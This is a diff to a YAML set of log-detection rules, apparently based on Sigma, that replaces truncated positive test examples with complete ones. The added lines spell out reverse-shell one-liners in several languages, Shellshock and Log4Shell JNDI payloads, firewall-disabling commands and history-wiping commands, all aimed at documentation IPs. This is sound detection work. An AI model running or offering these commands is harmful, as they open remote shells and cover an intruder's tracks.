@@ -59,26 +59,26 @@
       - 'Nov 20 10:01:02 web01 bash[4242]: HISTORY: PID=4242 UID=33 bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
       - 'audit: cmdline="python3 -c import socket,os;s=socket.socket();s.connect((\"203.0.113.7\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(''HISTFILE'',''/dev/null'');"'
       - 'Nov 20 10:05:00 app02 sh[311]: rm -f /tmp/p; mknod /tmp/p p && telnet 198.51.100.4 80 0</tmp/p | /bin/bash 1>/tmp/p'
-      - 'Nov 21 09:00:47 host01 bash[4100]: HISTORY: BEGIN {s = "/inet/tcp/0/'
-      - 'Nov 21 09:00:48 host01 bash[4100]: HISTORY: bash -i >& /dev/udp/'
-      - 'Nov 21 09:00:49 host01 bash[4100]: HISTORY: sh -i >$ /dev/udp/'
-      - 'Nov 21 09:00:50 host01 bash[4100]: HISTORY: sh -i >$ /dev/tcp/'
-      - 'Nov 21 09:00:51 host01 bash[4100]: HISTORY: && while read line 0<&5; do'
-      - 'Nov 21 09:00:52 host01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/tcp/'
-      - 'Nov 21 09:00:53 host01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/udp/'
-      - 'Nov 21 09:00:54 host01 bash[4100]: HISTORY: nc -e /bin/sh '
-      - 'Nov 21 09:00:55 host01 bash[4100]: HISTORY: /bin/sh | nc'
-      - 'Nov 21 09:00:56 host01 bash[4100]: HISTORY: rm -f backpipe; mknod /tmp/backpipe p && nc '
-      - 'Nov 21 09:00:57 host01 bash[4100]: HISTORY: ;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'
-      - 'Nov 21 09:00:58 host01 bash[4100]: HISTORY: ;STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-      - 'Nov 21 09:00:59 host01 bash[4100]: HISTORY: /bin/sh -i <&3 >&3 2>&3'
-      - 'Nov 21 09:01:00 host01 bash[4100]: HISTORY: uname -a; w; id; /bin/bash -i'
-      - 'Nov 21 09:01:01 host01 bash[4100]: HISTORY: $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};'
-      - 'Nov 21 09:01:02 host01 bash[4100]: HISTORY: .to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-      - 'Nov 21 09:01:03 host01 bash[4100]: HISTORY: ;while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print'
-      - 'Nov 21 09:01:04 host01 bash[4100]: HISTORY: socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:'
-      - 'Nov 21 09:01:05 host01 bash[4100]: HISTORY:  | /bin/bash | telnet '
-      - 'Nov 21 09:01:06 host01 bash[4100]: HISTORY: ,echo=0,raw tcp-listen:'
+      - 'Nov 21 09:00:01 web01 bash[4100]: HISTORY: awk ''BEGIN {s = "/inet/tcp/0/203.0.113.7/4444"; while(42) {}}'' /dev/null'
+      - 'Nov 21 09:00:02 web01 bash[4100]: HISTORY: bash -i >& /dev/udp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:03 web01 bash[4100]: HISTORY: sh -i >$ /dev/udp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:04 web01 bash[4100]: HISTORY: sh -i >$ /dev/tcp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:05 web01 bash[4100]: HISTORY: exec 5<>/dev/tcp/203.0.113.7/4444 && while read line 0<&5; do $line 2>&5 >&5; done'
+      - 'Nov 21 09:00:06 web01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/tcp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:07 web01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/udp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:08 web01 bash[4100]: HISTORY: nc -e /bin/sh 203.0.113.7 4444'
+      - 'Nov 21 09:00:09 web01 bash[4100]: HISTORY: /bin/sh | nc 203.0.113.7 4444'
+      - 'Nov 21 09:00:10 web01 bash[4100]: HISTORY: rm -f backpipe; mknod /tmp/backpipe p && nc 203.0.113.7 4444'
+      - 'Nov 21 09:00:11 web01 bash[4100]: HISTORY: perl -e ''use Socket;$i="203.0.113.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");exec("/bin/sh -i");};'''
+      - 'Nov 21 09:00:12 web01 bash[4100]: HISTORY: perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"203.0.113.7:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'''
+      - 'Nov 21 09:00:13 web01 bash[4100]: HISTORY: /bin/sh -i <&3 >&3 2>&3'
+      - 'Nov 21 09:00:14 web01 bash[4100]: HISTORY: uname -a; w; id; /bin/bash -i'
+      - 'powershell -nop -c "... $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};"'
+      - 'Nov 21 09:00:15 web01 bash[4100]: HISTORY: ruby -rsocket -e''f=TCPSocket.open("203.0.113.7",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'''
+      - 'Nov 21 09:00:16 web01 bash[4100]: HISTORY: ruby -rsocket -e ''c=TCPSocket.new("203.0.113.7","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'''
+      - 'Nov 21 09:00:17 web01 bash[4100]: HISTORY: socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:203.0.113.7:4444'
+      - 'Nov 21 09:00:18 web01 bash[4100]: HISTORY: telnet 203.0.113.7 8080 | /bin/bash | telnet 203.0.113.7 8081'
+      - 'Nov 21 09:00:19 web01 bash[4100]: HISTORY: socat file:`tty`,echo=0,raw tcp-listen:4444'
     negative:
       - 'Nov 20 10:06:00 app02 sudo[9930]: alice : COMMAND=/usr/bin/nc -zv db01 5432'
       - 'Nov 20 10:07:00 app02 bash[812]: HISTORY: PID=812 UID=1000 bash -i ./deploy.sh --env staging'
@@ -157,9 +157,9 @@
     positive:
       - 'Nov 20 12:00:00 web01 bash[5011]: HISTORY: 0<&196;exec 196<>/dev/tcp/203.0.113.7/443; sh <&196 >&196 2>&196'
       - 'Nov 20 12:01:00 web01 php-fpm[880]: exec("bash -c ''bash -i >& /dev/tcp/203.0.113.7/80 0>&1''")'
-      - 'Nov 21 09:01:07 host01 bash[4100]: HISTORY: (sh)0>/dev/tcp/'
-      - 'Nov 21 09:01:08 host01 bash[4100]: HISTORY: echo -e ''#!/bin/bash\nbash -i >& /dev/tcp/'
-      - 'Nov 21 09:01:09 host01 bash[4100]: HISTORY: sh -i >& /dev/udp/'
+      - 'Nov 21 09:00:20 web01 bash[4100]: HISTORY: (sh)0>/dev/tcp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:21 web01 bash[4100]: HISTORY: echo -e ''#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:22 web01 bash[4100]: HISTORY: sh -i >& /dev/udp/203.0.113.7/4444 0>&1'
     negative:
       - 'Nov 20 12:02:00 web01 healthcheck: bash -c "echo > /dev/tcp/127.0.0.1/5432" && echo db up'
       - 'Nov 20 12:03:00 web01 bash[5011]: HISTORY: exec 3<>/dev/null; echo done'
@@ -282,7 +282,7 @@
       - 'Nov 20 12:19:00 web01 bash[5026]: HISTORY: script -q /tmp/session.log'
 
 - id: mention.sigma_shell_socat_exec
-  title: socat executing a program or writing to /tmp (Sigma "Suspicious Activity in Shell Commands")
+  title: 'socat exec: or socat -O /tmp/ text (Sigma "Suspicious Activity in Shell Commands")'
   match:
     literal: ['socat exec:', 'socat -O /tmp/']
   case_sensitive: false
@@ -300,7 +300,7 @@
   examples:
     positive:
       - 'Nov 20 12:20:00 web01 bash[5027]: HISTORY: socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:203.0.113.7:4444'
-      - 'Nov 21 09:01:10 host01 bash[4100]: HISTORY: socat -O /tmp/'
+      - 'Nov 21 09:00:23 web01 bash[4100]: HISTORY: socat -O /tmp/.x tcp:203.0.113.7:4444'
     negative:
       - 'Nov 20 12:21:00 web01 systemd[1]: Started socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock'
       - 'Nov 20 12:22:00 web01 bash[5028]: HISTORY: socat - TCP:db01:5432'
@@ -354,7 +354,7 @@
       - 'Nov 20 12:28:00 web01 bash[5034]: HISTORY: chmod +x ./deploy.sh; ./deploy.sh'
 
 - id: mention.sigma_shell_exploit_staging
-  title: Exploit-kit staging strings (Sigma "Suspicious Activity in Shell Commands")
+  title: 'Exploit-kit command strings (Sigma "Suspicious Activity in Shell Commands")'
   match:
     literal:
       - 'cd /tmp || cd /var/run || cd /mnt'
@@ -384,20 +384,20 @@
     positive:
       - 'Nov 20 12:29:00 web01 java[2001]: Runtime exec: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://203.0.113.7/a.sh'
       - 'Nov 20 12:30:00 web01 bash[5035]: HISTORY: chmod u+s /tmp/rootshell'
-      - 'Nov 21 09:01:11 host01 bash[4100]: HISTORY: stop;service iptables stop;'
-      - 'Nov 21 09:01:12 host01 bash[4100]: HISTORY: stop;SuSEfirewall2 stop;'
-      - 'Nov 21 09:01:13 host01 bash[4100]: HISTORY: chmod 777 2020'
-      - 'Nov 21 09:01:14 host01 bash[4100]: HISTORY: /chmod u+s '
-      - 'Nov 21 09:01:15 host01 bash[4100]: HISTORY: chmod +s /tmp/'
-      - 'Nov 21 09:01:16 host01 bash[4100]: HISTORY:  /tmp/haxhax'
-      - 'Nov 21 09:01:17 host01 bash[4100]: HISTORY:  /tmp/ns_sploit'
-      - 'Nov 21 09:01:18 host01 bash[4100]: HISTORY: /tmp/ysocereal.jar'
+      - 'Nov 21 09:00:24 web01 java[2001]: Runtime exec: sh -c stop;service iptables stop; x'
+      - 'Nov 21 09:00:25 web01 java[2001]: Runtime exec: sh -c stop;SuSEfirewall2 stop; x'
+      - 'Nov 21 09:00:26 web01 java[2001]: Runtime exec: sh -c chmod 777 2020 x'
+      - 'Nov 21 09:00:27 web01 java[2001]: Runtime exec: sh -c /chmod u+s x'
+      - 'Nov 21 09:00:28 web01 bash[4100]: HISTORY: chmod +s /tmp/.x'
+      - 'Nov 21 09:00:29 web01 java[2001]: Runtime exec: sh -c /tmp/haxhax x'
+      - 'Nov 21 09:00:30 web01 java[2001]: Runtime exec: sh -c /tmp/ns_sploit x'
+      - 'Nov 21 09:00:31 web01 java[2001]: Runtime exec: sh -c /tmp/ysocereal.jar x'
     negative:
       - 'Nov 20 12:31:00 web01 bash[5036]: HISTORY: chmod 755 /usr/local/bin/backup.sh'
       - 'Nov 20 12:32:00 web01 systemd[1]: Stopping iptables.service - IPv4 firewall with iptables...'
 
 - id: mention.sigma_shell_staging_medium
-  title: Staging fragments with ordinary uses (Sigma "Suspicious Activity in Shell Commands")
+  title: 'Dropper command fragments with common admin look-alikes (Sigma "Suspicious Activity in Shell Commands")'
   match:
     literal:
       - 'echo binary >>'
@@ -428,7 +428,7 @@
       - 'Nov 20 12:36:00 web01 bash[5040]: HISTORY: chmod +x ./bin/run.sh'
 
 - id: mention.sigma_shell_staging_weak
-  title: Generic staging fragments (Sigma "Suspicious Activity in Shell Commands")
+  title: 'Generic dropper fragments (Sigma "Suspicious Activity in Shell Commands")'
   match:
     literal: [' | base64 -d ', 'cp /bin/ksh ', 'cp /bin/sh ', '/tmp/x ']
   case_sensitive: false
@@ -492,7 +492,7 @@
   examples:
     positive:
       - 'Nov 20 13:00:00 sol01 genunix: [ID 533030 kern.notice] NOTICE: in.ftpd[1772] attempt to execute code on stack by uid 0'
-      - 'Nov 21 09:01:19 host01 bash[4100]: HISTORY: 0bin0sh1'
+      - 'Nov 21 09:00:49 ftp01 ftpd[311]: FTP LOGIN FROM 203.0.113.9 [203.0.113.9], 0bin0sh1'
     negative:
       - 'Nov 20 13:01:00 sol01 genunix: [ID 540533 kern.notice] SunOS Release 5.10 Version Generic'
       - 'Nov 20 13:02:00 web01 kernel: [ 33.1] NX (Execute Disable) protection: active'
@@ -565,30 +565,30 @@
     positive:
       - 'Nov 20 13:06:00 sun02 bash[611]: HISTORY: cp /etc/shadow /tmp/.; ls -la /tmp'
       - 'Nov 20 13:07:00 sun02 bash[612]: HISTORY: > /var/log/audit/audit.log; rm -f .bash_history'
-      - 'Nov 21 09:01:20 host01 bash[4100]: HISTORY: cp /bin/sh .;chown'
-      - 'Nov 21 09:01:21 host01 bash[4100]: HISTORY: chmod 4777 /tmp/.scsi/dev/bin/gsh'
-      - 'Nov 21 09:01:22 host01 bash[4100]: HISTORY: chown root:root /tmp/.scsi/dev/bin/'
-      - 'Nov 21 09:01:23 host01 bash[4100]: HISTORY: chown root:root x;'
-      - 'Nov 21 09:01:24 host01 bash[4100]: HISTORY: /bin/telnet locip locport < /dev/console | /bin/sh'
-      - 'Nov 21 09:01:25 host01 bash[4100]: HISTORY: /tmp/ratload'
-      - 'Nov 21 09:01:26 host01 bash[4100]: HISTORY: cat > /dev/tcp/127.0.0.1/80 <<END'
-      - 'Nov 21 09:01:27 host01 bash[4100]: HISTORY: rm -f /current/tmp/ftshell.latest'
-      - 'Nov 21 09:01:28 host01 bash[4100]: HISTORY: cp /var/log/audit/audit.log .tmp'
-      - 'Nov 21 09:01:29 host01 bash[4100]: HISTORY: < /dev/console | uudecode && uncompress'
-      - 'Nov 21 09:01:30 host01 bash[4100]: HISTORY: sendmail -osendmail;chmod +x sendmail'
-      - 'Nov 21 09:01:31 host01 bash[4100]: HISTORY: chmod 666 /var/run/utmp~'
-      - 'Nov 21 09:01:32 host01 bash[4100]: HISTORY: chmod 700 nscd crond'
-      - 'Nov 21 09:01:33 host01 bash[4100]: HISTORY: </dev/console |uudecode > /dev/null 2>&1 && uncompress'
-      - 'Nov 21 09:01:34 host01 bash[4100]: HISTORY: chmod 700 jp&&netstat -an|grep'
-      - 'Nov 21 09:01:35 host01 bash[4100]: HISTORY: chmod 700 fp sendmail pt'
-      - 'Nov 21 09:01:36 host01 bash[4100]: HISTORY: chmod 755 /usr/vmsys/bin/pipe'
-      - 'Nov 21 09:01:37 host01 bash[4100]: HISTORY: chmod -R 755 /usr/vmsys'
+      - 'Nov 21 09:00:50 sun02 bash[4100]: HISTORY: cp /bin/sh .;chown'
+      - 'Nov 21 09:00:51 sun02 bash[4100]: HISTORY: chmod 4777 /tmp/.scsi/dev/bin/gsh'
+      - 'Nov 21 09:00:52 sun02 bash[4100]: HISTORY: chown root:root /tmp/.scsi/dev/bin/'
+      - 'Nov 21 09:00:53 sun02 bash[4100]: HISTORY: chown root:root x;'
+      - 'Nov 21 09:00:54 sun02 bash[4100]: HISTORY: /bin/telnet locip locport < /dev/console | /bin/sh'
+      - 'Nov 21 09:00:55 sun02 bash[4100]: HISTORY: /tmp/ratload'
+      - 'Nov 21 09:00:56 sun02 bash[4100]: HISTORY: cat > /dev/tcp/127.0.0.1/80 <<END'
+      - 'Nov 21 09:00:57 sun02 bash[4100]: HISTORY: rm -f /current/tmp/ftshell.latest'
+      - 'Nov 21 09:00:58 sun02 bash[4100]: HISTORY: cp /var/log/audit/audit.log .tmp'
+      - 'Nov 21 09:00:59 sun02 bash[4100]: HISTORY: < /dev/console | uudecode && uncompress'
+      - 'Nov 21 09:01:00 sun02 bash[4100]: HISTORY: sendmail -osendmail;chmod +x sendmail'
+      - 'Nov 21 09:01:01 sun02 bash[4100]: HISTORY: chmod 666 /var/run/utmp~'
+      - 'Nov 21 09:01:02 sun02 bash[4100]: HISTORY: chmod 700 nscd crond'
+      - 'Nov 21 09:01:03 sun02 bash[4100]: HISTORY: </dev/console |uudecode > /dev/null 2>&1 && uncompress'
+      - 'Nov 21 09:01:04 sun02 bash[4100]: HISTORY: chmod 700 jp&&netstat -an|grep'
+      - 'Nov 21 09:01:05 sun02 bash[4100]: HISTORY: chmod 700 fp sendmail pt'
+      - 'Nov 21 09:01:06 sun02 bash[4100]: HISTORY: chmod 755 /usr/vmsys/bin/pipe'
+      - 'Nov 21 09:01:07 sun02 bash[4100]: HISTORY: chmod -R 755 /usr/vmsys'
     negative:
       - 'Nov 20 13:08:00 sun02 bash[613]: HISTORY: cp /etc/hosts /tmp/hosts.bak'
       - 'Nov 20 13:09:00 sun02 auditd[455]: Audit daemon rotating log files'
 
 - id: mention.sigma_equationgroup_generic
-  title: Equation Group fragments with generic wording (Sigma "Equation Group Indicators")
+  title: 'Equation Group fragments with generic words (Sigma "Equation Group Indicators")'
   match:
     literal: ['ewok -t ', 'xspy -display ', ' --wipe > /dev/null', 'chmod 700 crond', 'chmod 700 sendmail', 'chmod 0700 sendmail']
   case_sensitive: false
@@ -726,7 +726,7 @@
       - 'Nov 20 13:27:00 sun02 bash[631]: HISTORY: chmod 755 /usr/local/sbin/cron-report'
 
 - id: mention.sigma_equationgroup_wget_sendmail
-  title: Download and chmod of a fake sendmail (Sigma "Equation Group Indicators")
+  title: 'wget of a sendmail file with chmod +x (Sigma "Equation Group Indicators")'
   match:
     anchored: 'wget http[^\n]{0,200}sendmail; ?chmod \+x (?:/tmp/)?sendmail'
   case_sensitive: false
@@ -953,9 +953,9 @@
   examples:
     positive:
       - 'Nov 20 13:53:00 web01 bash[657]: HISTORY: export HISTFILESIZE=0; export HISTSIZE=0'
-      - 'Nov 21 09:01:38 host01 bash[4100]: HISTORY: empty_bash_history'
-      - 'Nov 21 09:01:39 host01 bash[4100]: HISTORY: shopt -ou history'
-      - 'Nov 21 09:01:40 host01 bash[4100]: HISTORY: shopt -uo history'
+      - 'Nov 21 09:01:08 web01 bash[4100]: HISTORY: empty_bash_history'
+      - 'Nov 21 09:01:09 web01 bash[4100]: HISTORY: shopt -ou history; cd /tmp'
+      - 'Nov 21 09:01:10 web01 bash[4100]: HISTORY: shopt -uo history; cd /tmp'
     negative:
       - 'Nov 20 13:54:00 web01 bash[658]: HISTORY: export HISTFILESIZE=100000'
       - 'Nov 20 13:55:00 web01 bash[659]: HISTORY: shopt -s histappend'
@@ -1026,9 +1026,9 @@
   examples:
     positive:
       - '203.0.113.50 - - [20/Nov/2026:14:00:00 +0000] "GET /cgi-bin/status HTTP/1.1" 404 196 "-" "() { :; }; /bin/bash -c \"wget http://203.0.113.50/x\""'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:41 +0000] "GET /cgi-bin/status HTTP/1.1" 404 0 "-" "(){:;}; /bin/bash -c id"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:42 +0000] "GET /cgi-bin/status HTTP/1.1" 404 0 "-" "() {:;}; /bin/bash -c id"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:43 +0000] "GET /cgi-bin/status HTTP/1.1" 404 0 "-" "() { :;}; /bin/bash -c id"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:11 +0000] "GET /cgi-bin/status HTTP/1.1" 400 0 "-" "(){:;}; /bin/bash -c ''wget http://203.0.113.50/x''"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:12 +0000] "GET /cgi-bin/status HTTP/1.1" 400 0 "-" "() {:;}; /bin/bash -c ''wget http://203.0.113.50/x''"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:13 +0000] "GET /cgi-bin/status HTTP/1.1" 400 0 "-" "() { :;}; /bin/bash -c ''wget http://203.0.113.50/x''"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:14:01:00 +0000] "GET /app.js?v=() HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - 'Nov 20 14:02:00 web01 bash[663]: HISTORY: f() { echo hi; }; f'
@@ -1076,13 +1076,13 @@
   examples:
     positive:
       - 'Nov 20 14:06:00 web01 bash[666]: HISTORY: ln -s /etc/passwd /tmp/logfile; ./vuln-setuid'
-      - 'Nov 21 09:01:44 host01 bash[4100]: HISTORY: ln -s -f /etc/passwd'
+      - 'Nov 21 09:01:14 web01 bash[4100]: HISTORY: ln -s -f /etc/passwd /tmp/logfile'
     negative:
       - 'Nov 20 14:07:00 web01 bash[667]: HISTORY: ln -s /etc/nginx/sites-available/app /etc/nginx/sites-enabled/app'
       - 'Nov 20 14:08:00 web01 bash[668]: HISTORY: grep alice /etc/passwd'
 
 - id: mention.sigma_bpf_probe_write_user
-  title: eBPF program using bpf_probe_write_user (Sigma "Potential Suspicious BPF Activity - Linux")
+  title: 'eBPF bpf_probe_write_user kernel message (Sigma "Potential Suspicious BPF Activity - Linux")'
   match:
     literal: ['bpf_probe_write_user']
   case_sensitive: false
@@ -1243,7 +1243,7 @@
       - 'Nov 20 14:29:00 web01 bash[669]: HISTORY: grep -c FOUND /var/log/clamav/clamav.log'
 
 - id: mention.sigma_crontab_replace
-  title: 'crontab REPLACE log text (narrowing of Sigma "Modifying Crontab")'
+  title: 'crontab REPLACE log text (narrow form of Sigma "Modifying Crontab")'
   match:
     anchored: '\) REPLACE \('
   case_sensitive: true
@@ -1323,7 +1323,7 @@
       - 'Nov 20 14:38:00 gw01 sshd[2206]: Accepted publickey for alice from 10.0.0.4 port 51023 ssh2'
 
 - id: mention.sigma_security_tool_stop
-  title: Firewall or EDR service stopping (Sigma "Disabling Security Tools - Builtin")
+  title: 'Firewall or EDR ''stopping'' service messages (Sigma "Disabling Security Tools - Builtin")'
   match:
     literal: ['stopping iptables', 'stopping ip6tables', 'stopping firewalld', 'stopping cbdaemon', 'stopping falcon-sensor']
   case_sensitive: false
@@ -1677,25 +1677,25 @@
   examples:
     positive:
       - '203.0.113.50 - - [20/Nov/2026:15:18:00 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/Command/Base64/d2dldCBodHRw} HTTP/1.1" 200 12 "-" "curl/8.0"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:45 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/ReverseShell/x} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:46 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/TomcatMemshellx} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:47 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/JettyMemshellx} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:48 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/WeblogicMemshellx} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:49 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/JBossMemshellx} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:50 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/WebsphereMemshellx} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:51 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/SpringMemshellx} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:52 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/URLDNS/x} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:53 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/CommonsCollections1/Dnslog/x} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:54 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/CommonsCollections2/Command/Base64/x} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:55 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/CommonsBeanutils1/ReverseShell/x} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:56 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/Jre8u20/TomcatMemshellx} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:57 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/Dnslog/x} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:58 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/Command/x} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:01:59 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/ReverseShell/x} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:00 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/TomcatMemshellx} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:01 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/SpringMemshellx} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:02 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/GroovyBypass/Command/x} HTTP/1.1" 200 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:03 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/WebsphereBypass/Upload/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:32 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/ReverseShell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:33 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/TomcatMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:34 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/JettyMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:35 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/WeblogicMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:36 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/JBossMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:37 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/WebsphereMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:38 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/SpringMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:39 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/URLDNS/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:40 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/CommonsCollections1/Dnslog/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:41 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/CommonsCollections2/Command/Base64/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:42 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/CommonsBeanutils1/ReverseShell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:43 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/Jre8u20/TomcatMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:44 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/Dnslog/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:45 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/Command/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:46 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/ReverseShell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:47 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/TomcatMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:48 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/SpringMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:49 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/GroovyBypass/Command/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
